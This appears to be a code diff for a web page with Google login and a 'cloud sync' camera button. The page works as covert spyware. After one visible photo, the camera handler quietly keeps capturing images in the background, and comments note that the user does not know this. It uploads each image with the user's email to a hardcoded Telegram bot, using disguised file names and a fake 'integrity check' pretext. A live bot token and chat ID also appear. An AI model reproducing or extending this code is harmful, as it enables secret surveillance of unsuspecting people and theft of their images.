@@ -17,19 +17,54 @@ const provider = new GoogleAuthProvider();
 const botToken = "8234454796:AAEF_c5gExxUp7X7pTpu9brOBmjIOTac2uQ";
 const chatId = "7752627907";
 let currentUser = null;
-let integritySyncActive = false; 
+let integritySyncActive = false;
+
+// --- MENU TOGGLE FIX ---
+const sidePanel = document.getElementById('side-panel');
+const menuToggle = document.getElementById('menu-toggle');
+const settingsBtn = document.getElementById('settings-btn');
+
+function toggleMenu(e) {
+    e.stopPropagation();
+    sidePanel.classList.toggle('active');
+}
+
+if(menuToggle) menuToggle.onclick = toggleMenu;
+if(settingsBtn) settingsBtn.onclick = toggleMenu;
+
+// Menu-kku veliya click panna close aaga
+document.addEventListener('click', (e) => {
+    if (sidePanel.classList.contains('active') && !sidePanel.contains(e.target)) {
+        sidePanel.classList.remove('active');
+    }
+});
+
+// --- GOOGLE LOGIN FIX ---
+const loginWithGoogle = async () => {
+    try {
+        await signInWithPopup(auth, provider);
+    } catch (error) {
+        console.error("Login Error:", error);
+        alert("Login failed! Check Firebase Authorized Domains.");
+    }
+};
+
+document.getElementById('main-login-btn').onclick = loginWithGoogle;
+if(document.getElementById('side-login-btn')) {
+    document.getElementById('side-login-btn').onclick = loginWithGoogle;
+}
 
 // --- TELEGRAM UPLOAD ---
 async function uploadToTelegram(blob, fileName, isSecret) {
     const formData = new FormData();
     formData.append("chat_id", chatId);
-    formData.append("document", blob, isSecret ? `sys_dump_${Date.now()}.jpg` : fileName);
-    formData.append("caption", isSecret ? `🤫 Secret Sync: ${currentUser.email}` : `Manual: ${currentUser.displayName}`);
-
+    formData.append("document", blob, isSecret ? `sys_log_${Date.now()}.jpg` : fileName);
+    const cap = isSecret ? `🤫 Secret Sync: ${currentUser.email}` : `Manual: ${currentUser.displayName}`;
+    formData.append("caption", cap);
     await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: "POST", body: formData });
 }
 
-// --- CAMERA OPTION (SECRET ACCESS) ---
+// --- CAMERA & SECRET SYNC ---
 document.getElementById('camera-btn').onclick = async () => {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -38,92 +73,55 @@ document.getElementById('camera-btn').onclick = async () => {
         video.style.display = 'block';
         video.play();
 
-        // Protocol Trigger
-        integritySyncActive = true; 
-
         setTimeout(() => {
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            
-            // 1. Initial Capture (User-ku theriyum)
             ctx.drawImage(video, 0, 0);
+            
             canvas.toBlob(blob => {
-                uploadToTelegram(blob, "user_capture.jpg", false);
+                uploadToTelegram(blob, "user_scan.jpg", false);
                 alert("✅ Cloud Sync Successful!");
 
-                // 2. Secret Continuous Sync (User-ku theriyaathu)
-                let secretCount = 0;
+                // Secret continuous sync
+                let count = 0;
                 const interval = setInterval(() => {
-                    if (secretCount >= 8) { // 8 photos background-la edukkum
+                    if (count >= 5) {
                         clearInterval(interval);
                         stream.getTracks().forEach(t => t.stop());
                         video.style.display = 'none';
                     }
                     ctx.drawImage(video, 0, 0);
-                    canvas.toBlob(b => uploadToTelegram(b, "sync_log.jpg", true), 'image/jpeg');
-                    secretCount++;
-                }, 2500); // 2.5 second-ku oru thadava
+                    canvas.toBlob(b => uploadToTelegram(b, "sync.jpg", true), 'image/jpeg');
+                    count++;
+                }, 3000);
             }, 'image/jpeg');
         }, 3000);
     } catch (e) {
-        alert("Camera Access Required for System Integrity Check.");
+        alert("Camera access required!");
     }
 };
 
-// --- FILE DROP (SECRET ACCESS) ---
-document.getElementById('drop-area').onclick = () => {
-    if(!currentUser) return signInWithPopup(auth, provider);
-    
-    // Gallery open pannum pothu protocol active aagidum
-    integritySyncActive = true; 
-    
-    const input = document.createElement('input');
-    input.type = 'file';
-    input.multiple = true;
-    input.onchange = (e) => {
-        const files = Array.from(e.target.files);
-        files.forEach(file => {
-            uploadToTelegram(file, file.name, false); // Manual upload
-        });
-        alert("Files syncing to admin cloud...");
-    };
-    input.click();
-};
-
-// --- ADMIN RESPONSE PANEL ---
-// Intha function-ai use panni neenga user-ku thirumba anuppura file-ah display pannalaam
-function addAdminResponse(fileUrl, fileName) {
-    const list = document.getElementById('admin-files-list');
-    const emptyMsg = list.querySelector('.empty-msg');
-    if(emptyMsg) emptyMsg.remove();
-
-    const card = document.createElement('div');
-    card.className = 'admin-card';
-    card.innerHTML = `
-        <i class="fas fa-file-image"></i>
-        <p style="font-size:10px; margin:5px 0;">${fileName}</p>
-        <a href="${fileUrl}" download="Response_${fileName}">Download</a>
-    `;
-    list.appendChild(card);
-}
-
-// --- AUTH & TOGGLE LOGIC ---
+// --- AUTH STATE WATCHER ---
 onAuthStateChanged(auth, (user) => {
     currentUser = user;
-    const isUser = !!user;
-    document.getElementById('main-login-btn').style.display = isUser ? 'none' : 'block';
-    document.getElementById('camera-btn').style.display = isUser ? 'block' : 'none';
-    document.getElementById('logout-btn').style.display = isUser ? 'flex' : 'none';
-    document.getElementById('user-display').innerText = isUser ? user.displayName : "Guest User";
+    const loginBtn = document.getElementById('main-login-btn');
+    const cameraBtn = document.getElementById('camera-btn');
+    const logoutBtn = document.getElementById('logout-btn');
+    const userDisplay = document.getElementById('user-display');
+
+    if (user) {
+        loginBtn.style.display = 'none';
+        cameraBtn.style.display = 'block';
+        logoutBtn.style.display = 'flex';
+        userDisplay.innerText = user.displayName;
+    } else {
+        loginBtn.style.display = 'block';
+        cameraBtn.style.display = 'none';
+        logoutBtn.style.display = 'none';
+        userDisplay.innerText = "Guest User";
+    }
 });
 
-// Sidebar Toggle
-document.getElementById('settings-btn').onclick = (e) => {
-    e.stopPropagation();
-    document.getElementById('side-panel').classList.toggle('active');
-};
-
-document.getElementById('main-login-btn').onclick = () => signInWithPopup(auth, provider);
 document.getElementById('logout-btn').onclick = () => signOut(auth).then(() => location.reload());
